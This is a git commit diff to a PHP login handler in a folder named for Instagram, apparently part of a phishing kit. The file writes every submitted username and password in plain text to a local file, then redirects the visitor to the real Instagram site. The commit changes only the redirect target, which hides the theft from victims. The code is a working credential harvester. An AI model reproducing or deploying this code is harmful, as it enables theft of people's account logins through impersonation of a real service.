9b172abcdc25682e8147ab4799690e6d9ea533c3
Nebula-appdev <71981359+Nebula-appdev@users.noreply.github.com>
2020-09-27 23:46:02 +0530

    Update login.php

--- websites/instagram/login.php
+++ websites/instagram/login.php
@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.instagram.com/p/B1junLYlNFqqAIJyVqAId7ZKWKKSAFaacQM3EI0/');
+header('Location: https://www.instagram.com');
 exit();
